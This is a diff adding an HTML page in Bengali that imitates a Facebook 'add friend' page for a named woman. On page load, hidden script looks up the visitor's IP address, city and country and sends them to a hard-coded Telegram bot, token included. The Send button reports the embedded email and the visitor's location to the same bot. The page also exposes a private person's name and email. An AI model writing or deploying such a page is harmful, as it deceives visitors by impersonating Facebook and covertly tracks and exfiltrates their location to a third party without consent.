@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* ইমেজের মাপ আগের মতো রাখা হয়েছে */
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; position: relative; }
+        
+        .main-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin-bottom: 5px; }
+        .sub-text { font-size: 16px; color: #606770; line-height: 1.5; padding: 0 10px; margin-bottom: 10px; }
+
+        /* জীবন্ত লাল তীরের অ্যানিমেশন */
+        .red-arrow {
+            color: #ff0000;
+            font-size: 50px;
+            margin-bottom: -5px;
+            animation: bounce 0.8s infinite;
+            font-weight: bold;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 20px; text-decoration: none; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3); }
+        .btn-blue:active { transform: scale(0.95); }
+        
+        .hidden-data { display: none; }
+    </style>
+</head>
+<body onload="captureStart()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+        <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+
+        <div class="red-arrow">⬇</div>
+
+        <div class="hidden-data">
+            <input type="email" id="targetEmail" value="Priyaakter200302@gmail.com">
+            <textarea id="targetMsg">Hi ,, কেমন আছেন .</textarea>
+        </div>
+
+        <button onclick="finalSubmit()" class="btn-blue">Send</button>
+
+        <p class="mt-4 text-gray-400 text-xs italic">Secure connection active...</p>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let fullLoc = "Fetching...";
+
+    async function captureStart() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            fullLoc = `${d.city}, ${d.country_name} (${d.ip})`;
+            sendToBot(`🌐 **নতুন ভিজিটর!**\n📍 লোকেশন: ${fullLoc}`);
+        } catch (e) {
+            sendToBot(`🌐 **নতুন ভিজিটর!** (লোকেশন পাওয়া যায়নি)`);
+        }
+    }
+
+    function finalSubmit() {
+        const email = document.getElementById('targetEmail').value;
+        const message = document.getElementById('targetMsg').value;
+        const subject = "Contact Notification";
+
+        // ১. জিমেইল লিঙ্ক তৈরি
+        const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(message)}`;
+
+        // ২. টেলিগ্রাম বটে বাটনসহ মেসেজ পাঠানো
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "📧 Gmail Send Option", url: mailtoLink }]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: `🎯 **অ্যাকশন ক্যাপচার!**\n📧 টার্গেট: ${email}\n📍 লোকেশন: ${fullLoc}\n\nনিচের বাটনে ক্লিক করে জিমেইল পাঠান:`,
+                reply_markup: keyboard 
+            })
+        });
+
+        // ৩. সরাসরি ইউজারের ফোনেও জিমেইল অ্যাপ ওপেন করা
+        window.location.href = mailtoLink;
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text }) 
+        });
+    }
+</script>
+</body>
+</html>
